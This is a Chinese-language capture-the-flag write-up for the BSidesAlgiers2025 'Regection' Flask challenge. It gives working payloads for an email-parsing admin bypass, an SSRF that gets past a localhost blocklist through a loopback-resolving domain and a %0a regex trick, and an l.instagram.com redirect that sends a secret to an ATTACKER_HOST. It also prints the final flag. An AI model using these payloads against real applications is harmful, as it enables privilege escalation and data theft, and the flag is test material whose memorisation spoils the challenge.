# BSidesAlgiers2025 - Regection

## 题目简述

`Regection` 是一个 Flask 管理后台 + 自动化审核流程的组合题，题目目标是拿到两段 flag（`shellmates{part1_part2}`）。

关键接口：

- `/register`：创建账号；
- `/login`：只有管理员可看见后续功能；
- `/check_link`：管理员可触发外链访问；
- `/internal/vip_search`：仅限本地访问，返回 `John_Doe` 信息中含第一段；
- `/social_media_bot`：将用户提交的 Instagram 链接替换 `{username}` 后交给无头浏览器访问，返回页标题。

决定性障碍是 **三段式身份/访问链闭合**：先用邮件解析差异拿到 admin，再用 `check_link` SSRF 访问内网接口拿第一段 flag，最后通过 Instagram 链接测试页拿第二段 flag（`TEST_ACCOUNT`）。

## 解题过程

### 关键观察

#### 1）登录 / 注册解析差异（管理员角色绕过）

注册与登录对邮箱处理不同，关键判定可缩写为：

```python
_, addr = email.utils.parseaddr(email_addr)
registration_blocked = "admin.managely.social" in addr
login_domain = email_addr.split("@")[-1]
login_as_admin = login_domain == "admin.managely.social"
```

`register` 使用 `parseaddr` 后再比对，而 `login` 用原始 `split('@')[-1]`，两处规则存在不一致。官方解法给出的可用样式包括：

```text
collab@psres.net"@admin.managely.social
collab@psres.net(@admin.managely.social
collab@psres.net,@admin.managely.social
```

以最后一种为例，`parseaddr` 取到的有效地址部分不含受限域名，注册检查通过；原始字符串最后一个 `@` 后仍是 `admin.managely.social`，登录时便被提升为管理员。官方引用的 [Python email 地址解析行为差异案例](https://github.com/python/cpython/issues/102988) 说明了同类边界输入为何不能在不同接口中混用两套解析器；本文已经给出本题实际利用值，外链只用于追溯解析器背景。

#### 2）`/internal/vip_search` 的第一段 flag

```python
is_local = request.remote_addr == "127.0.0.1"
query = request.args.get("q", "")
pattern = re.compile(r"^(?!.*John_Doe).*", flags=re.IGNORECASE)
query_allowed = bool(re.match(pattern, query))
```

`/check_link` 对管理员可用，但拦截了常见本地地址关键字/格式：

```python
contains_localhost = "localhost" in url
blocked_patterns = [r"127\.", r"169\.254\."]
matches_blocklist = any(re.search(pattern, url) for pattern in blocked_patterns)
```

官方解法使用解析到本地环回的域名 `yoogle.com` 绕过字符串黑名单，再访问 `vip_search`。这不是开放重定向：`requests` 直接解析该域名，连接目标成为 `127.0.0.1`，而过滤器只检查 URL 文本。

另外 `John_Doe` 过滤使用 `re.match` 且只看行首模式，`%0a` 能让规则失效，读取到敏感条目。

#### 3）`/social_media_bot` 的第二段 flag

```python
hostname = urlparse(url).hostname
domain = tldextract.extract(hostname).domain
final_url = url.replace("{username}", TEST_ACCOUNT)
parsed_url = urlparse(final_url)
allowed = parsed_url.scheme in ("http", "https") and domain == "instagram"
page_title = run_selenium(final_url)
```

校验只看原始链接的注册域为 `instagram`，而 `l.instagram.com` 提供跳转参数。服务先把 `{username}` 替换成秘密 `TEST_ACCOUNT`，浏览器随后跳到攻击者站点；从接收端的请求路径即可读取替换后的账号名。

官方 payload 中还带有当时的 Instagram 跟踪参数，这些值会失效，不应原样归档。稳定的结构是：

```text
https://l.instagram.com/?u=https%3A%2F%2FATTACKER_HOST%2F{username}
```

复现时将 `ATTACKER_HOST` 换成自己可查看访问日志的 HTTPS 主机，并按 Instagram 当前页面要求补充跳转参数；关键机制是保留 `{username}`，让服务端在浏览器访问前完成替换。

### 求解步骤（可复现）

1. 用 `collab@psres.net,@admin.managely.social` 注册并以同一原始字符串登录，使 `split('@')[-1]` 落在 `admin.managely.social`，拿到 admin token；
2. 访问 `/check_link`，使用替换后的域名与 `%0a` 组合打到 `http://yoogle.com:8000/internal/vip_search?q=%0aJohn_Doe`；
3. 读取返回内容中的 `John_Doe` `bio` 作为第一段；
4. 在“Instagram Integration”测试处提交保留 `{username}` 的 `l.instagram.com` 跳转链接，从接收端日志取得第二段 `TEST_ACCOUNT`；
5. 拼接 flag。

官方最终验证字符串为：

`shellmates{COngRats_Y0U_muSt_be_4_GOOOO0D_HACkER_HuUuuh?_world_record_egg}`

### 验证

`solution/README.md` 明确给出了第一段与第二段的提取路径、实际邮箱绕过值、Instagram 跳转结构和拼接后的完整 flag。

## 方法总结

- 核心技巧：优先比较不同接口的解析语义（`parseaddr` vs `split`），这类差异可作为垂直提权起点；随后用 SSRF/字符边界（`%0a`）串联内部接口再完成第二段提权信息外泄。
- 识别信号：看到“管理员入口 + 注册解析 + 内部接口 + 链路外部化（Bot/Link Checker）”应先审计“等价字符串处理差异”与过滤器是否用 `match`/关键字黑名单。
- 复用要点：这类挑战中第一段通常是“身份越权 + 内网可达接口”，第二段常通过 bot/回调链路从配置或外部参数回传，验证思路应先建立完整链而非单点爆破。
